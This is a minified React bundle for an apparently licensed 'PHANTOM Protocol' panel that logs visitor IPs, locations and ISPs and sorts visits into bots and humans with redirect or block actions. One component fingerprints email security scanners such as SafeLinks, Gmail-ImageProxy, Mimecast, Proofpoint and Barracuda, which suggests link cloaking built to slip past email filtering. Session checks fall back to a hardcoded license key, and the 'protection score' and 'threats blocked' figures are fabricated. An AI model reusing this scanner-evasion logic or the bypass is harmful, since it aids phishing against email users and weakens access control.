tracking-wider",children:"TERMINATED"});default:return a.jsx(Se,{className:"bg-gradient-to-r from-gray-500/30 to-slate-400/30 text-gray-200 border border-gray-400/40 font-jetbrains font-bold uppercase tracking-wider",children:t.status.toUpperCase()})}},d=()=>`${t.password_generation_count} / ${t.max_password_generations} PASSWORD GENERATIONS`,u=()=>t.password_generation_count/t.max_password_generations*100,h=g=>g?{"1_day":"ALPHA1 [24H]","2_days":"BETA2 [48H]","5_days":"GAMMA5 [120H]","1_month":"DELTA30 [LUNAR]","1_year":"OMEGA365 [SOLAR]",lifetime:"QUANTUM ETERNAL"}[g]||`${g.toUpperCase()} PROTOCOL`:"CUSTOM PROTOCOL",f=u(),m=f>80;return a.jsxs(q,{className:"mb-6 relative bg-glass-tier-1 border border-cyan-400/30 backdrop-blur-sm overflow-hidden shadow-2xl",children:[a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/50 to-transparent"}),a.jsxs(X,{className:"relative z-10 p-0",children:[a.jsxs("div",{className:"p-6 cursor-pointer flex items-center justify-between hover:bg-cyan-500/10 transition-all duration-300 group",onClick:()=>i(!s),children:[a.jsx("div",{className:"flex items-center gap-4",children:a.jsx("div",{className:"flex flex-col gap-1",children:a.jsx("div",{className:"flex items-center gap-2",children:c()})})}),a.jsxs("div",{className:"flex items-center gap-4",children:[a.jsx(k4,{expiresAt:t.expires_at,expiryPreset:t.expiry_preset}),a.jsx("div",{className:"p-2 rounded-lg bg-slate-700/50 border border-cyan-400/30 group-hover:border-cyan-300/50 transition-colors",children:s?a.jsx(Zl,{className:"w-5 h-5 text-cyan-400"}):a.jsx(qh,{className:"w-5 h-5 text-cyan-400"})})]})]}),!s&&a.jsxs("div",{className:"px-6 pb-6 space-y-4 border-t border-cyan-400/20 bg-gradient-to-b from-transparent to-blue-900/20",children:[t.assigned_user_email&&a.jsxs("div",{className:"flex items-center gap-4 p-4 rounded-lg bg-slate-800/50 border border-cyan-400/20",children:[a.jsx("div",{className:"p-2 bg-gradient-to-br from-purple-400/20 to-blue-500/20 rounded-lg border border-purple-400/30",children:a.jsx(ny,{className:"w-5 h-5 text-purple-300"})}),a.jsx("div",{className:"flex-1",children:a.jsx("span",{className:"text-purple-200 font-jetbrains text-sm",children:t.assigned_user_email})})]}),a.jsxs("div",{className:"flex items-center gap-4 p-4 rounded-lg bg-slate-800/50 border border-cyan-400/20",children:[a.jsx("div",{className:"p-2 bg-gradient-to-br from-indigo-400/20 to-purple-500/20 rounded-lg border border-indigo-400/30",children:a.jsx(Ge,{className:"w-5 h-5 text-indigo-300"})}),a.jsx("div",{className:"flex-1",children:a.jsx(Se,{variant:"outline",className:"bg-gradient-to-r from-indigo-500/20 to-purple-500/20 text-indigo-200 border-indigo-400/40 font-jetbrains font-bold uppercase tracking-wider",children:h(t.expiry_preset)})})]}),a.jsxs("div",{className:"space-y-3 p-4 rounded-lg bg-slate-800/50 border border-cyan-400/20",children:[a.jsxs("div",{className:"flex items-center gap-4",children:[a.jsx("div",{className:"p-2 bg-gradient-to-br from-orange-400/20 to-red-500/20 rounded-lg border border-orange-400/30",children:a.jsx(wa,{className:"w-5 h-5 text-orange-300"})}),a.jsx("div",{className:"flex-1",children:a.jsx("span",{className:`font-jetbrains text-lg font-bold ${m?"text-yellow-300":"text-orange-200"}`,children:d()})})]}),a.jsx("div",{className:"w-full bg-slate-700/70 rounded-full h-3 overflow-hidden border border-cyan-400/20",children:a.jsx("div",{className:`h-full transition-all duration-500 ${f>90?"bg-gradient-to-r from-red-500 to-pink-400":f>70?"bg-gradient-to-r from-yellow-500 to-orange-400":"bg-gradient-to-r from-emerald-500 to-cyan-400"}`,style:{width:`${Math.min(f,100)}%`}})})]}),a.jsxs("div",{className:"flex items-center gap-4 p-4 rounded-lg bg-slate-800/50 border border-cyan-400/20",children:[a.jsx("div",{className:"p-2 bg-gradient-to-br from-cyan-400/20 to-blue-500/20 rounded-lg border border-cyan-400/30",children:a.jsx(ey,{className:"w-5 h-5 text-cyan-300"})}),a.jsx("div",{className:"flex-1",children:a.jsxs("code",{className:"text-cyan-200 font-jetbrains text-sm bg-slate-700/70 px-3 py-2 rounded border border-cyan-400/30",children:[t.license_key.slice(0,8),"",t.license_key.slice(-4)]})})]})]})]})]})},C4=()=>{const[t,e]=p.useState({totalVisits:0,humanVisits:0,botVisits:0,todayVisits:0,todayHuman:0,todayBot:0}),[r,n]=p.useState(!0);p.useEffect(()=>{s();const c=setInterval(s,6e4);return()=>clearInterval(c)},[]);const s=async()=>{try{const{data:c,error:d}=await $.rpc("get_real_analytics_summary");if(d){console.error("Error fetching analytics data:",d);return}const u=c;e({totalVisits:(u==null?void 0:u.totalVisits)||0,humanVisits:(u==null?void 0:u.humanVisits)||0,botVisits:(u==null?void 0:u.botVisits)||0,todayVisits:(u==null?void 0:u.todayVisits)||0,todayHuman:(u==null?void 0:u.todayHuman)||0,todayBot:(u==null?void 0:u.todayBot)||0})}catch(c){console.error("Error fetching analytics data:",c)}finally{n(!1)}},i=t.totalVisits>0?Math.round(t.humanVisits/t.totalVisits*100):0,o=t.totalVisits>0?Math.round(t.botVisits/t.totalVisits*100):0,l=[{title:"HUMAN VISITORS",value:t.humanVisits.toLocaleString(),percentage:i,icon:bl,color:"emerald",description:`${t.todayHuman} today`,gradient:"from-emerald-500/40 to-green-400/40",border:"border-emerald-400/50",text:"text-emerald-300"},{title:"BOT DETECTIONS",value:t.botVisits.toLocaleString(),percentage:o,icon:Jx,color:"red",description:`${t.todayBot} today`,gradient:"from-red-500/40 to-orange-400/40",border:"border-red-400/50",text:"text-red-300"},{title:"TOTAL VISITS",value:t.totalVisits.toLocaleString(),percentage:100,icon:kn,color:"blue",description:`${t.todayVisits} today`,gradient:"from-cyan-500/40 to-blue-400/40",border:"border-cyan-400/50",text:"text-cyan-300"}];return r?a.jsx("div",{className:"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 mt-6",children:[1,2,3].map(c=>a.jsx(q,{className:"relative bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900 border-cyan-500/20 backdrop-blur-sm overflow-hidden",children:a.jsxs(X,{className:"p-6",children:[a.jsxs("div",{className:"flex items-center gap-3 mb-4",children:[a.jsx("div",{className:"p-2 bg-slate-700/50 rounded-lg animate-pulse",children:a.jsx(Rt,{className:"w-5 h-5 text-cyan-400/50 animate-spin"})}),a.jsx("div",{className:"flex-1 min-w-0",children:a.jsx("div",{className:"h-3 bg-slate-700/50 rounded animate-pulse"})})]}),a.jsxs("div",{className:"space-y-3",children:[a.jsx("div",{className:"h-8 bg-slate-700/50 rounded animate-pulse"}),a.jsxs("div",{className:"flex items-center justify-between",children:[a.jsx("div",{className:"h-3 bg-slate-700/50 rounded flex-1 mr-4 animate-pulse"}),a.jsx("div",{className:"h-3 bg-slate-700/50 rounded w-8 animate-pulse"})]})]})]})},c))}):a.jsx("div",{className:"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 mt-6",children:l.map((c,d)=>a.jsxs(q,{className:`relative bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900 ${c.border} backdrop-blur-sm overflow-hidden hover:scale-105 transition-all duration-300 shadow-2xl`,children:[a.jsx("div",{className:`absolute inset-0 bg-gradient-to-br ${c.gradient} animate-pulse`}),a.jsxs(X,{className:"relative z-10 p-6",children:[a.jsxs("div",{className:"flex items-center gap-3 mb-4",children:[a.jsx("div",{className:`p-2 bg-gradient-to-br ${c.gradient} rounded-lg ${c.border}`,children:a.jsx(c.icon,{className:`w-5 h-5 ${c.text}`})}),a.jsx("div",{className:"flex-1 min-w-0",children:a.jsx("span",{className:`font-jetbrains text-xs font-bold ${c.text} uppercase tracking-wider block truncate`,children:c.title})})]}),a.jsxs("div",{className:"space-y-3",children:[a.jsx("div",{className:`font-jetbrains text-2xl font-bold ${c.text}`,children:c.value}),a.jsxs("div",{className:"flex items-center justify-between",children:[a.jsx("span",{className:"text-slate-300 font-jetbrains text-xs",children:c.description}),a.jsxs("span",{className:`font-jetbrains text-xs font-bold ${c.text}`,children:[c.percentage,"%"]})]})]})]})]},c.title))})},T4=({analyticsData:t})=>{const[e,r]=p.useState([]),[n,s]=p.useState(!0),i=async()=>{try{const u=localStorage.getItem("license_session_token");if(!u){console.log("No session token found for visit logs"),r([]),s(!1);return}const{data:h,error:f}=await $.from("user_sessions").select("license_key_id").eq("session_token",u).eq("is_active",!0).maybeSingle();if(f||!h){console.error("Session error:",f),r([]),s(!1);return}const{data:m,error:g}=await $.from("visit_logs").select("*").eq("license_key_id",h.license_key_id).order("created_at",{ascending:!1}).limit(50);g?(console.error("Logs error:",g),r([])):r(m||[])}catch(u){console.error("Error fetching visit logs:",u),r([])}finally{s(!1)}};p.useEffect(()=>{i();const u=$.channel("visit-logs-changes").on("postgres_changes",{event:"*",schema:"public",table:"visit_logs"},h=>{console.log("Visit logs changed:",h),i()}).subscribe();return()=>{$.removeChannel(u)}},[]);const o=(u,h)=>{const f={redirect:{color:"bg-blue-500/20 text-blue-300 border-blue-400/40",text:"REDIRECT"},blocked:{color:"bg-red-500/20 text-red-300 border-red-400/40",text:"BLOCKED"},monitored:{color:"bg-yellow-500/20 text-yellow-300 border-yellow-400/40",text:"MONITORED"},allowed:{color:"bg-emerald-500/20 text-emerald-300 border-emerald-400/40",text:"ALLOWED"},unknown:{color:"bg-slate-500/20 text-slate-300 border-slate-400/40",text:"UNKNOWN"}},m=f[u]||f.unknown;return a.jsx("span",{className:`inline-flex items-center px-2 py-1 rounded-md text-xs font-bold border ${m.color}`,children:m.text})},l=(u,h)=>{if(!h||u===0)return null;let f="bg-emerald-500/20 text-emerald-300 border-emerald-400/40";return u>=80?f="bg-red-500/20 text-red-300 border-red-400/40":u>=60&&(f="bg-yellow-500/20 text-yellow-300 border-yellow-400/40"),a.jsxs("span",{className:`inline-flex items-center px-2 py-1 rounded-md text-xs font-bold border ${f}`,children:[u,"% BOT"]})},c=u=>{if(!u||u.length!==2)return"";const f=u.toUpperCase().split("").map(m=>127397+m.charCodeAt(0));return String.fromCodePoint(...f)},d=u=>{const h=new Date(u),m=new Date().getTime()-h.getTime(),g=Math.floor(m/6e4),v=Math.floor(m/36e5);return g<1?"Just now":g<60?`${g}m ago`:v<24?`${v}h ago`:h.toLocaleDateString()+" "+h.toLocaleTimeString([],{hour:"2-digit",minute:"2-digit"})};return n?a.jsx("div",{className:"relative bg-glass-tier-2 border border-slate-400/30 backdrop-blur-sm rounded-lg overflow-hidden",children:a.jsxs("div",{className:"p-6",children:[a.jsxs("div",{className:"flex items-center gap-3 mb-6",children:[a.jsx("div",{className:"p-2 bg-gradient-to-br from-slate-400/20 to-gray-500/20 rounded-lg border border-slate-400/30",children:a.jsx(Nn,{className:"w-5 h-5 text-slate-300"})}),a.jsx("span",{className:"font-jetbrains text-slate-300 text-sm font-bold uppercase tracking-wider",children:"REAL-TIME VISIT LOGS"})]}),a.jsx("div",{className:"space-y-3",children:[...Array(5)].map((u,h)=>a.jsx("div",{className:"animate-pulse",children:a.jsx("div",{className:"h-12 bg-slate-700/30 rounded-lg"})},h))})]})}):a.jsxs("div",{className:"relative bg-glass-tier-2 border border-slate-400/30 backdrop-blur-sm rounded-lg overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-slate-400/5 via-gray-500/5 to-slate-400/5 animate-gradient-flow"}),a.jsxs("div",{className:"relative z-10 p-6",children:[a.jsxs("div",{className:"flex items-center justify-between mb-6",children:[a.jsxs("div",{className:"flex items-center gap-3",children:[a.jsx("div",{className:"p-2 bg-gradient-to-br from-slate-400/20 to-gray-500/20 rounded-lg border border-slate-400/30",children:a.jsx(Nn,{className:"w-5 h-5 text-slate-300"})}),a.jsxs("div",{children:[a.jsx("span",{className:"font-jetbrains text-slate-300 text-sm font-bold uppercase tracking-wider",children:"REAL-TIME VISIT LOGS"}),a.jsxs("div",{className:"text-slate-400 text-xs",children:[e.length," records | Live tracking active"]})]})]}),a.jsxs(W,{size:"sm",variant:"outline",className:"border-slate-400/40 hover:border-slate-300/60 bg-slate-800/50 hover:bg-slate-700/60 text-slate-200",onClick:()=>{s(!0),i()},children:[a.jsx(Rt,{className:"w-4 h-4 mr-2"}),"Refresh"]})]}),e.length===0?a.jsx("div",{className:"text-center py-8",children:a.jsx("div",{className:"text-slate-400 text-sm",children:"No visit logs found. Visits will appear here in real-time."})}):a.jsx("div",{className:"overflow-x-auto",children:a.jsxs("table",{className:"w-full text-sm",children:[a.jsx("thead",{children:a.jsxs("tr",{className:"border-b border-slate-600/30",children:[a.jsx("th",{className:"text-left py-3 px-4 font-jetbrains text-slate-300 uppercase tracking-wider text-xs",children:"Time"}),a.jsx("th",{className:"text-left py-3 px-4 font-jetbrains text-slate-300 uppercase tracking-wider text-xs",children:"IP Address"}),a.jsx("th",{className:"text-left py-3 px-4 font-jetbrains text-slate-300 uppercase tracking-wider text-xs",children:"Location"}),a.jsx("th",{className:"text-left py-3 px-4 font-jetbrains text-slate-300 uppercase tracking-wider text-xs",children:"ISP"}),a.jsx("th",{className:"text-left py-3 px-4 font-jetbrains text-slate-300 uppercase tracking-wider text-xs",children:"Device"}),a.jsx("th",{className:"text-left py-3 px-4 font-jetbrains text-slate-300 uppercase tracking-wider text-xs",children:"Browser"}),a.jsx("th",{className:"text-left py-3 px-4 font-jetbrains text-slate-300 uppercase tracking-wider text-xs",children:"Status"}),a.jsx("th",{className:"text-left py-3 px-4 font-jetbrains text-slate-300 uppercase tracking-wider text-xs",children:"Action"})]})}),a.jsx("tbody",{children:e.map(u=>a.jsxs("tr",{className:`border-b border-slate-700/30 hover:bg-slate-700/20 transition-colors ${u.is_bot?"bg-red-900/10":"bg-emerald-900/5"}`,children:[a.jsx("td",{className:"py-3 px-4",children:a.jsxs("div",{className:"flex items-center gap-2",children:[a.jsx(cr,{className:"w-3 h-3 text-slate-500"}),a.jsx("span",{className:"text-slate-300 text-xs font-mono",children:d(u.created_at)})]})}),a.jsx("td",{className:"py-3 px-4",children:a.jsxs("div",{className:"flex items-center gap-2",children:[u.is_bot?a.jsx(Jx,{className:"w-4 h-4 text-red-400"}):a.jsx(ny,{className:"w-4 h-4 text-emerald-400"}),a.jsx("span",{className:"font-mono text-slate-200 text-xs",children:u.ip_address})]})}),a.jsx("td",{className:"py-3 px-4",children:a.jsxs("div",{className:"flex items-center gap-2",children:[a.jsx("span",{className:"text-lg",children:c(u.country_code)}),a.jsxs("div",{className:"text-xs",children:[a.jsx("div",{className:"text-slate-200",children:u.city||u.region||u.country_name||"Unknown"}),a.jsx("div",{className:"text-slate-500",children:u.country_code})]})]})}),a.jsx("td",{className:"py-3 px-4",children:a.jsx("span",{className:"text-slate-300 text-xs",children:u.isp||"Unknown ISP"})}),a.jsx("td",{className:"py-3 px-4",children:a.jsx("span",{className:"text-slate-300 text-xs",children:u.device_type||u.os||"Unknown"})}),a.jsx("td",{className:"py-3 px-4",children:a.jsx("span",{className:"text-slate-300 text-xs",children:u.browser||"Unknown"})}),a.jsx("td",{className:"py-3 px-4",children:a.jsxs("div",{className:"flex items-center gap-2",children:[u.is_bot?a.jsx("span",{className:"text-red-300 text-xs font-bold",children:"BOT"}):a.jsx("span",{className:"text-emerald-300 text-xs font-bold",children:"HUMAN"}),l(u.bot_confidence,u.is_bot)]})}),a.jsx("td",{className:"py-3 px-4",children:o(u.action_taken,u.is_bot)})]},u.id))})]})})]})]})},P4=()=>{const[t,e]=p.useState(null),[r,n]=p.useState(!0),[s,i]=p.useState(!0),{toast:o}=Ln(),l=async()=>{try{const c=localStorage.getItem("license_session_token");if(console.log("Session token found:",c?"Yes":"No"),!c){console.log("No session token found for analytics"),e(null),n(!1);return}const{data:d,error:u}=await $.from("user_sessions").select("license_key_id").eq("session_token",c).eq("is_active",!0).gte("expires_at","now()").maybeSingle();console.log("Session query result:",{sessionData:d,sessionError:u});let h=d;if(u||!d){console.error("Session validation failed, trying direct license lookup...");const{data:_}=await $.from("license_keys").select("id").eq("license_key","C884F50E7B934CABBA383191").maybeSingle();if(console.log("Direct license lookup:",_),_)h={license_key_id:_.id};else{e(null),n(!1);return}}const{data:f,error:m}=await $.from("user_visit_stats").select("*").eq("license_key_id",h.license_key_id).order("visit_date",{ascending:!1});if(m){console.error("Stats error:",m),e(null),n(!1);return}const{data:g}=await $.from("visit_logs").select("*").eq("license_key_id",h.license_key_id);console.log("Visit logs found:",(g==null?void 0:g.length)||0),console.log("Visit stats found:",(f==null?void 0:f.length)||0);let v,w,y,x,b,j;if(f.length>0){v=f.reduce((S,k)=>S+k.total_visits,0),w=f.reduce((S,k)=>S+k.human_visits,0),y=f.reduce((S,k)=>S+k.bot_visits,0);const _=new Date().toISOString().split("T")[0],N=f.find(S=>S.visit_date===_);x=(N==null?void 0:N.total_visits)||0,b=(N==null?void 0:N.human_visits)||0,j=(N==null?void 0:N.bot_visits)||0}else if(g&&g.length>0){v=g.length,w=g.filter(S=>!S.is_bot).length,y=g.filter(S=>S.is_bot).length;const _=new Date().toISOString().split("T")[0],N=g.filter(S=>S.created_at.startsWith(_));x=N.length,b=N.filter(S=>!S.is_bot).length,j=N.filter(S=>S.is_bot).length}else v=w=y=x=b=j=0;e({totalVisits:v,humanVisits:w,botVisits:y,todayVisits:x,todayHuman:b,todayBot:j,topCountries:[],recentActivity:[]})}catch(c){console.error("Error fetching analytics:",c),e(null)}finally{n(!1)}};return p.useEffect(()=>{l();const c=$.channel("visit-analytics-changes").on("postgres_changes",{event:"*",schema:"public",table:"user_visit_stats"},d=>{console.log("Visit stats changed:",d),l(),d.eventType==="INSERT"&&o({title:"New Visit Recorded",description:`Visit logged for ${d.new.visit_date}`,variant:"default"})}).on("postgres_changes",{event:"INSERT",schema:"public",table:"visit_logs"},d=>{console.log("New visit log:",d),l(),o({title:" Visit Detected",description:`${d.new.is_bot?"Bot":"Human"} visit from ${d.new.country_name||"Unknown"}`,variant:"default"})}).subscribe();return()=>{$.removeChannel(c)}},[o]),r?a.jsxs(q,{className:"mb-6 relative bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/10 via-blue-500/10 to-purple-500/10 animate-gradient-flow"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/50 to-transparent animate-scan-line"}),a.jsx(X,{className:"relative z-10 p-6",children:a.jsxs("div",{className:"animate-pulse",children:[a.jsxs("div",{className:"flex items-center gap-3 mb-4",children:[a.jsx("div",{className:"w-6 h-6 bg-cyan-400/30 rounded animate-pulse"}),a.jsx("div",{className:"h-5 bg-cyan-400/20 rounded w-1/3"})]}),a.jsx("div",{className:"h-4 bg-blue-400/20 rounded w-1/2"})]})})]}):t?a.jsxs(q,{className:"mb-6 relative bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900 border border-cyan-400/30 backdrop-blur-sm overflow-hidden shadow-2xl",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/10 via-blue-500/10 to-purple-500/10 animate-gradient-flow"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/50 to-transparent animate-scan-line"}),a.jsx("div",{className:"absolute top-4 right-6 w-3 h-3 bg-cyan-400/30 rounded-full animate-pulse"}),a.jsx("div",{className:"absolute bottom-4 left-8 w-2 h-2 bg-blue-400/40 rounded-full animate-pulse",style:{animationDelay:"1s"}}),a.jsxs(X,{className:"relative z-10 p-0",children:[a.jsxs("div",{className:"p-6 cursor-pointer flex items-center justify-between hover:bg-cyan-500/10 transition-all duration-300 group",onClick:()=>i(!s),children:[a.jsxs("div",{className:"flex items-center gap-4",children:[a.jsxs("div",{className:"relative",children:[a.jsx("div",{className:"absolute inset-0 bg-cyan-400/30 rounded-lg animate-pulse blur-sm"}),a.jsx("div",{className:"relative z-10 p-2 bg-gradient-to-br from-cyan-400/20 to-blue-500/20 rounded-lg border border-cyan-400/30",children:a.jsx(Fj,{className:"w-6 h-6 text-cyan-300"})})]}),a.jsxs("div",{className:"flex flex-col gap-1",children:[a.jsx("span",{className:"font-jetbrains text-lg font-bold text-cyan-200 uppercase tracking-wider",children:"VISIT ANALYTICS MATRIX"}),a.jsxs("div",{className:"flex items-center gap-2",children:[a.jsxs(Se,{className:"relative bg-gradient-to-r from-cyan-500/30 to-blue-400/30 text-cyan-200 border border-cyan-400/40 font-jetbrains font-bold uppercase tracking-wider backdrop-blur-sm",children:[a.jsx("div",{className:"absolute inset-0 bg-cyan-400/20 animate-pulse rounded"}),a.jsx("span",{className:"relative z-10",children:"ACTIVE"})]}),a.jsxs(Se,{variant:"outline",className:"bg-gradient-to-r from-blue-500/20 to-cyan-500/20 text-blue-200 border-blue-400/40 font-jetbrains font-bold uppercase tracking-wider",children:[t.totalVisits," TOTAL"]})]})]})]}),a.jsxs("div",{className:"flex items-center gap-4",children:[a.jsxs("div",{className:"text-right",children:[a.jsx("div",{className:"text-cyan-300 font-jetbrains text-sm font-bold",children:"TODAY"}),a.jsx("div",{className:"text-cyan-200 font-jetbrains text-lg font-bold",children:t.todayVisits})]}),a.jsx("div",{className:"p-2 rounded-lg bg-slate-700/50 border border-cyan-400/30 group-hover:border-cyan-300/50 transition-colors",children:s?a.jsx(Zl,{className:"w-5 h-5 text-cyan-400"}):a.jsx(qh,{className:"w-5 h-5 text-cyan-400"})})]})]}),!s&&a.jsxs("div",{className:"px-6 pb-6 space-y-6 border-t border-cyan-400/20 bg-gradient-to-b from-transparent to-blue-900/20",children:[a.jsx(C4,{}),a.jsx(T4,{analyticsData:t})]})]})]}):null},A4=()=>{const[t,e]=p.useState({threatLevel:"low",botDetections:0,humanVisits:0,blockedThreats:0,protectionScore:99,lastThreatDetected:null,emailScannerDetections:0,scannerTypes:{}}),[r,n]=p.useState(!0),[s,i]=p.useState(!1),o=async()=>{try{const d=localStorage.getItem("license_session_token");if(!d){n(!1);return}const{data:u}=await $.rpc("validate_session_with_license",{session_token_input:d}),h=typeof u=="string"?JSON.parse(u):u;if(!(h!=null&&h.valid)){n(!1);return}const{data:f}=await $.from("user_visit_stats").select("*").eq("license_key_id",h.license_id).gte("visit_date",new Date(Date.now()-7*24*60*60*1e3).toISOString().split("T")[0]).order("visit_date",{ascending:!1}),m=(f==null?void 0:f.reduce((_,N)=>_+N.bot_visits,0))||0,g=(f==null?void 0:f.reduce((_,N)=>_+N.human_visits,0))||0,v=m+g,{data:w}=await $.from("visit_logs").select("user_agent, action_taken").eq("license_key_id",h.license_id).gte("created_at",new Date(Date.now()-7*24*60*60*1e3).toISOString()),y=(w==null?void 0:w.filter(_=>_.user_agent&&(_.user_agent.includes("Microsoft-URLAnalyzer")||_.user_agent.includes("SafeLinks")||_.user_agent.includes("Gmail-ImageProxy")||_.user_agent.includes("Mimecast")||_.user_agent.includes("Proofpoint")||_.user_agent.includes("Barracuda")||_.action_taken==="email_scanner_detected")))||[],x={};y.forEach(_=>{var N,S,k,C,T,M;(N=_.user_agent)!=null&&N.includes("Microsoft-URLAnalyzer")||(S=_.user_agent)!=null&&S.includes("SafeLinks")?x["Microsoft 365"]=(x["Microsoft 365"]||0)+1:(k=_.user_agent)!=null&&k.includes("Gmail-ImageProxy")?x.Gmail=(x.Gmail||0)+1:(C=_.user_agent)!=null&&C.includes("Mimecast")?x.Mimecast=(x.Mimecast||0)+1:(T=_.user_agent)!=null&&T.includes("Proofpoint")?x.Proofpoint=(x.Proofpoint||0)+1:(M=_.user_agent)!=null&&M.includes("Barracuda")?x.Barracuda=(x.Barracuda||0)+1:x.Other=(x.Other||0)+1});let b="low";if(v>0){const _=m/v*100;_>70?b="high":_>40&&(b="medium")}const j=Math.max(85,Math.min(99,99-m*2));e({threatLevel:b,botDetections:m,humanVisits:g,blockedThreats:Math.floor(m*.8),protectionScore:j,lastThreatDetected:m>0?"Recent":null,emailScannerDetections:y.length,scannerTypes:x})}catch(d){console.error("Error fetching security metrics:",d)}finally{n(!1)}};p.useEffect(()=>{o();const d=setInterval(o,3e4);return()=>clearInterval(d)},[]);const l=d=>{switch(d){case"high":return"text-red-600 bg-red-50 border-red-200";case"medium":return"text-amber-600 bg-amber-50 border-amber-200";default:return"text-emerald-600 bg-emerald-50 border-emerald-200"}},c=d=>d>=95?"text-emerald-600":d>=85?"text-blue-600":d>=75?"text-amber-600":"text-red-600";return r?a.jsx(q,{className:"animate-pulse",children:a.jsxs(X,{className:"p-6",children:[a.jsx("div",{className:"h-6 bg-slate-200 rounded mb-4"}),a.jsx("div",{className:"grid grid-cols-2 gap-4",children:[1,2,3,4].map(d=>a.jsx("div",{className:"h-16 bg-slate-200 rounded"},d))})]})}):a.jsx(q,{className:"bg-gradient-to-br from-slate-900 via-blue-900 to-indigo-900 text-white border-cyan-400/30",children:a.jsxs(X,{className:"p-6",children:[a.jsxs("div",{className:"flex items-center gap-3 mb-6",children:[a.jsxs("div",{className:"relative",children:[a.jsx("div",{className:"absolute inset-0 bg-cyan-400/30 rounded-lg animate-pulse blur-sm"}),a.jsx("div",{className:"relative z-10 p-2 bg-gradient-to-br from-cyan-400/20 to-blue-500/20 rounded-lg border border-cyan-400/30",children:a.jsx(lt,{className:"w-5 h-5 text-cyan-300"})})]}),a.jsxs("div",{className:"flex-1",children:[a.jsx("h3",{className:"font-jetbrains font-bold text-cyan-200 tracking-wider uppercase",children:"PHANTOM Protocol Status"}),a.jsx("p",{className:"font-jetbrains text-sm text-blue-300/80",children:"Real-time security monitoring with email scanner detection"})]}),a.jsxs("div",{className:"flex items-center gap-3",children:[a.jsxs(Se,{className:`font-jetbrains ${l(t.threatLevel)} font-bold uppercase tracking-wider`,children:[t.threatLevel," threat"]}),a.jsx("button",{onClick:()=>i(!s),className:"p-2 bg-slate-800/50 hover:bg-slate-700/60 rounded-lg border border-cyan-400/30 transition-all duration-300 backdrop-blur-sm","aria-label":s?"Collapse security details":"Expand security details",children:s?a.jsx(qh,{className:"w-4 h-4 text-cyan-300"}):a.jsx(Zl,{className:"w-4 h-4 text-cyan-300"})})]})]}),a.jsxs("div",{className:"mb-6 p-4 bg-gradient-to-r from-slate-800/50 to-blue-900/50 rounded-xl border border-cyan-400/20",children:[a.jsxs("div",{className:"flex items-center justify-between mb-2",children:[a.jsx("span",{className:"font-jetbrains text-cyan-300 font-medium",children:"Protection Score"}),a.jsxs("span",{className:`font-jetbrains text-2xl font-bold ${c(t.protectionScore)}`,children:[t.protectionScore,"%"]})]}),a.jsx("div",{className:"w-full bg-slate-700 rounded-full h-2",children:a.jsx("div",{className:"bg-gradient-to-r from-cyan-400 to-blue-500 h-2 rounded-full transition-all duration-1000",style:{width:`${t.protectionScore}%`}})})]}),a.jsxs("div",{className:`transition-all duration-500 ease-in-out overflow-hidden ${s?"max-h-[2000px] opacity-100":"max-h-0 opacity-0"}`,children:[a.jsxs("div",{className:"grid grid-cols-2 lg:grid-cols-5 gap-4 mb-6",children:[a.jsxs("div",{className:"p-4 bg-gradient-to-br from-emerald-500/20 to-green-500/20 rounded-xl border border-emerald-400/30",children:[a.jsxs("div",{className:"flex items-center gap-2 mb-2",children:[a.jsx(ba,{className:"w-4 h-4 text-emerald-400"}),a.jsx("span",{className:"font-jetbrains text-emerald-300 text-sm font-medium",children:"Human Visits"})]}),a.jsx("div",{className:"font-jetbrains text-2xl font-bold text-emerald-200",children:t.humanVisits})]}),a.jsxs("div",{className:"p-4 bg-gradient-to-br from-red-500/20 to-orange-500/20 rounded-xl border border-red-400/30",children:[a.jsxs("div",{className:"flex items-center gap-2 mb-2",children:[a.jsx(ct,{className:"w-4 h-4 text-red-400"}),a.jsx("span",{className:"font-jetbrains text-red-300 text-sm font-medium",children:"Bot Detections"})]}),a.jsx("div",{className:"font-jetbrains text-2xl font-bold text-red-200",children:t.botDetections})]}),a.jsxs("div",{className:"p-4 bg-gradient-to-br from-purple-500/20 to-indigo-500/20 rounded-xl border border-purple-400/30",children:[a.jsxs("div",{className:"flex items-center gap-2 mb-2",children:[a.jsx(qj,{className:"w-4 h-4 text-purple-400"}),a.jsx("span",{className:"font-jetbrains text-purple-300 text-sm font-medium",children:"Threats Blocked"})]}),a.jsx("div",{className:"font-jetbrains text-2xl font-bold text-purple-200",children:t.blockedThreats})]}),a.jsxs("div",{className:"p-4 bg-gradient-to-br from-blue-500/20 to-cyan-500/20 rounded-xl border border-blue-400/30",children:[a.jsxs("div",{className:"flex items-center gap-2 mb-2",children:[a.jsx(kn,{className:"w-4 h-4 text-blue-400"}),a.jsx("span",{className:"font-jetbrains text-blue-300 text-sm font-medium",children:"Email Scanners"})]}),a.jsx("div",{className:"font-jetbrains text-2xl font-bold text-blue-200",children:t.emailScannerDetections})]}),a.jsxs("div",{className:"p-4 bg-gradient-to-br from-cyan-500/20 to-blue-500/20 rounded-xl border border-cyan-400/30",children:[a.jsxs("div",{className:"flex items-center gap-2 mb-2",children:[a.jsx(Nn,{className:"w-4 h-4 text-cyan-400"}),a.jsx("span",{className:"font-jetbrains text-cyan-300 text-sm font-medium",children:"Last Scan"})]}),a.jsx("div",{className:"font-jetbrains text-sm font-bold text-cyan-200",children:"Active"})]})]}),a.jsxs("div",{className:"grid grid-cols-1 sm:grid-cols-2 gap-4",children:[a.jsxs("div",{className:"space-y-3",children:[a.jsx("h4",{className:"font-jetbrains font-semibold text-cyan-300 uppercase tracking-wide text-sm",children:"Active Defenses"}),[{icon:kn,name:"Ghost Protocol",status:"Active"},{icon:Bt,name:"Neural Firewall",status:"Active"},{icon:Ge,name:"Threat Radar",status:"Scanning"},{icon:lt,name:"Email Scanner 